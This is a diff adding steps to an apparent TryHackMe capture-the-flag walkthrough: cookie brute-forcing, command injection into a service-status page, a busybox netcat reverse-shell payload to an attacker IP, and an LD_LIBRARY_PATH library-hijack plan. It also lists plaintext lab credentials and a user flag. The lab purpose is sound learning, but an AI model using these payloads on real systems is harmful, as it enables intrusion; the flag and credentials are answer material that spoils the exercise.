@@ -20,11 +20,29 @@ Remember to remove the user with `sudo userdel nome_utente`. So I logged in the 
 ![image](https://github.com/user-attachments/assets/a3237956-df3d-4696-956c-0639f520f66d)<br />
 The `passwords_list.txt` file contains, guess what, a list of complex passwords. I think I need to use this list to bruteforce something. So I tried bruteforcing the login page to access the administration panel. 
 If you examine the cookie, you can see it's a base64 encoded string with the following format: `user:MD5_hashed_password`. So since we know that a user called `admin` exists, and we have the password list, then we have every ingredient to bruteforce logins.
-To do that, I created (thanks, Mr. GPT), a python script called `brutecookie.py` that you can find inside this folder.
+To do that, I created (thanks, Mr. GPT), a python script called `brutecookie.py` that you can find inside this folder. Remember to change the parameters according to your instance before executing the script.<br />
+![image](https://github.com/user-attachments/assets/c9ab8a6d-a882-4a69-9eb2-5298f9d37f4d)<br />
+Great, we can now login using this password!<br />
+![image](https://github.com/user-attachments/assets/67e4bff7-e207-4bfa-889c-f51bdc05c73f)<br />
+It seems like a page to check which services exists on the host. So my guess is that it executes something like `systemctl status example.service`. So I immediatly tought of command injection. `;` gets detected, then I tried `example && whoami` and it worked!<br />
+![image](https://github.com/user-attachments/assets/71ccdabd-303e-4378-baf7-483db20e0282)<br />
+Time to get a reverse shell. Open a nc listener and run use the following payload `& busybox nc 10.11.108.100 4444 -e sh`.<br />
+I immediately found credentials inside `confing.php`:<br />
+![image](https://github.com/user-attachments/assets/de2653f1-c3f3-4de4-9502-3117292f4123)<br />
+They look like mysql credentials, and I think they are, but I used them to access rick's account through ssh and get the first flag. <br />
+Running `sudo -l` we get the following:<br />
+![image](https://github.com/user-attachments/assets/a55d25fe-2c56-4435-8deb-e636213e3087)<br />
+We can execute a binary called `apache2` and have also access to the LD_LIBRARY_PATH. LD_LIBRARY_PATH allows us to specify where the program should go look for shared libraries/objects first. So the idea is to take the name of any of the libraries used by the `apache2` binary, and create a malicious script with that exact name inside a folder that we have access to. <br />
+![image](https://github.com/user-attachments/assets/b773529e-1c80-48a9-94b5-35e06b3946a8)<br />
+I'm gonna take `libpcre.so.3`. So, first of all, create the malicious .c file; you can find it inside this folder, called `exploit.c`
 
 
 
+
+
+rick:N3v3rG0nn4G1v3Y0uUp
+admin:uDh3jCQsdcuLhjVkAy5x
 ftpuser:W3stV1rg1n14M0un741nM4m4
 
-- What is the user flag?
+- What is the user flag? `THM{fdc8cd4cff2c19e0d1022e78481ddf36}`
 - What is the root flag?
